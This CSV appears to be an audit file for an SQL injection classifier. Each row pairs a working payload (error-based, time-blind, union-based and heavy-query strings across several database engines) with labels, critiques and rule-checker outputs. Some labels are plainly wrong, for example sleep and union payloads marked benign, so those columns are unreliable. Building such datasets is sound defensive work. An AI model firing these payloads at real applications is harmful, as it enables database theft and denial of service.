id,payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
18875,"1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 )",error_based,mysql,0.85,updatexml for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 )",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18876,"select * from generate_series ( 3990,3990,case when ( 3990 = 9597 ) then 1 else 0 end ) limit 1--",heavy_query,postgresql,0.9,generate_series for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,postgresql,"select * from generate_series ( 3990,3990,case when ( 3990 = 9597 ) then 1 else 0 end ) limit 1--",False,0,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal
18877,"1' ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'brlc' = 'brlc",heavy_query,sqlite,0.9,randomblob for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'brlc' = 'brlc",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
18878,"1' ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'yabn' = 'yabn",heavy_query,firebird,0.85,Multiple domain tables join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'yabn' = 'yabn",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18879,"1' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'opll' like 'opll",error_based,mysql,0.85,exp() for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'opll' like 'opll",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18880,"1"" ) as qjyu where 2679 = 2679 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.85,Multiple rdb tables join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1"" ) as qjyu where 2679 = 2679 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
18881,"1%' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( '%' = '",error_based,mysql,0.85,updatexml for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1%' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( '%' = '",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18882,"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""vukd"" = ""vukd",heavy_query,sqlite,0.9,randomblob for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""vukd"" = ""vukd",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
18883,"1"" or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""zcfa"" = ""zcfa",heavy_query,firebird,0.85,Multiple rdb tables join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1"" or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""zcfa"" = ""zcfa",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
18884,"1' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'jjmt' = 'jjmt",heavy_query,oracle,0.85,Multiple all_users table join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'jjmt' = 'jjmt",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18885,select ( case when ( 6839 = 2730 ) then 6839 else 6839* ( select 6839 from mysql.db ) end ) #,heavy_query,mysql,0.85,Multiple mysql db join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,select ( case when ( 6839 = 2730 ) then 6839 else 6839* ( select 6839 from mysql.db ) end ) #,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18886,"1%' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( '%' = '",error_based,mysql,0.85,extractvalue for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1%' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( '%' = '",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18887,"1' ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 'sucj' = 'sucj",heavy_query,generic,0.85,Multiple table join,RELABEL,reasoning too short (19 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,mysql,"1' ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 'sucj' = 'sucj",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18888,"select * from generate_series ( 3607,3607,case when ( 3607 = 4242 ) then 1 else 0 end ) limit 1--",heavy_query,postgresql,0.9,generate_series for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,postgresql,"select * from generate_series ( 3607,3607,case when ( 3607 = 4242 ) then 1 else 0 end ) limit 1--",False,0,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal
18889,select ( case when ( 3681 = 5026 ) then 3681 else 3681* ( select 3681 from information_schema.character_sets ) end ) #,heavy_query,db2,0.85,Multiple information_schema join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,mysql,select ( case when ( 3681 = 5026 ) then 3681 else 3681* ( select 3681 from information_schema.character_sets ) end ) #,False,0,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal
18890,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( 'wweo' = 'wweo",heavy_query,oracle,0.85,Multiple all_users table join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( 'wweo' = 'wweo",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18891,"1' in boolean mode ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,0.9,elt() with sleep for time blind,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1' in boolean mode ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
18892,"end and ( ( ( ""poee"" = ""poee",unknown,generic,0.5,Incomplete payload,RELABEL,type='unknown' needs verification; reasoning too short (18 chars); confidence too low (0.50); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,generic,"end and ( ( ( ""poee"" = ""poee",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
18893,"1%"" ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,sqlite,0.9,randomblob for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%"" ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
18894,"1%' ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,sqlite,0.9,randomblob for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%' ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
18895,"1%' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and '%' = '",heavy_query,sqlite,0.9,randomblob for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and '%' = '",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
18896,"1' ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 'cdaq' like 'cdaq",heavy_query,firebird,0.85,Multiple rdb tables join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1' ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 'cdaq' like 'cdaq",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
18897,"1 ) where 2781 = 2781 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.85,Multiple all_users table join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1 ) where 2781 = 2781 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18898,1%' rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,generic,0.9,sleep() for time blind,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,1%' rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,False,0,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
18899,-8729'+ ( select 'nbzl' where 7160 = 7160 order by 1#,unknown,generic,0.5,ORDER BY only - no clear technique,RELABEL,type='unknown' needs verification; confidence too low (0.50); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,generic,-8729'+ ( select 'nbzl' where 7160 = 7160 order by 1#,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18900,"1%' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( '%' = '",heavy_query,generic,0.85,Multiple table join,RELABEL,reasoning too short (19 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,mysql,"1%' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( '%' = '",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18901,"1 ) ) as ynzg where 1926 = 1926 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",error_based,mysql,0.85,extractvalue for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1 ) ) as ynzg where 1926 = 1926 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18902,"1' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( 'pcim' = 'pcim",heavy_query,sqlite,0.9,randomblob for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( 'pcim' = 'pcim",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
18903,"1'|| ( select 'rqzu' from dual where 9516 = 9516 or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,0.9,elt() with sleep for time blind,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,oracle,"1'|| ( select 'rqzu' from dual where 9516 = 9516 or elt ( 5873 = 5873,sleep ( 5 ) ) #",False,0,boolean_blind,oracle,Pattern match: 'elt (' → boolean_blind (P3); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
18904,"1%"" ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""%"" = """,heavy_query,sqlite,0.9,randomblob for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%"" ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""%"" = """,False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
18905,"1' where 9156 = 9156 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,sqlite,0.9,randomblob for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' where 9156 = 9156 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
18906,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'ekhi' = 'ekhi",heavy_query,sqlite,0.9,randomblob for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'ekhi' = 'ekhi",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
18907,select ( case when ( 7005 = 7118 ) then 1 else 7005* ( select 7005 from master..sysdatabases ) end ) --,heavy_query,mssql,0.85,Multiple sysdatabases join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,mssql,select ( case when ( 7005 = 7118 ) then 1 else 7005* ( select 7005 from master..sysdatabases ) end ) --,False,0,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal
18908,"1%"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"1%"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""%"" = """,False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18909,1' or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1' or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
18910,"-4394' ) ) union all select 3409,3409--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-4394' ) ) union all select 3409,3409--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
18911,1' ) where 1645 = 1645 rlike sleep ( 5 ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1' ) where 1645 = 1645 rlike sleep ( 5 ) --,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
18912,"-6890"" ) ) ) union all select 1115#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-6890"" ) ) ) union all select 1115#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
18913,1 ) ) rlike sleep ( 5 ) and ( ( 8773 = 8773,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1 ) ) rlike sleep ( 5 ) and ( ( 8773 = 8773,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
18914,"-7255' union all select 2127,2127,2127,2127,2127#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-7255' union all select 2127,2127,2127,2127,2127#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
18915,"1%"" ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'updatexml' (likely false negative),boolean_blind,mysql,"1%"" ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ""%"" = """,False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18916,"1' in boolean mode ) union all select null,null,null,null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"1' in boolean mode ) union all select null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
18917,"-4385%' ) ) union all select 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"-4385%' ) ) union all select 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
18918,"1 where 1153 = 1153 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'extractvalue' (likely false negative),boolean_blind,mysql,"1 where 1153 = 1153 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18919,"1' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'benchmark' (likely false negative),time_blind,mysql,"1' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18920,"1' ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( 'blnh' like 'blnh",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'extractvalue' (likely false negative),boolean_blind,mysql,"1' ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( 'blnh' like 'blnh",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18921,1'+ ( select 'toec' where 5810 = 5810 and sleep ( 5 ) ) +',benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,1'+ ( select 'toec' where 5810 = 5810 and sleep ( 5 ) ) +',False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
18922,"1', ( begin if ( 8340 = 8340 ) then dbms_lock.sleep ( 5 )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,"1', ( begin if ( 8340 = 8340 ) then dbms_lock.sleep ( 5 )",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,time_blind,mysql,time function 'dbms_lock.sleep' detected
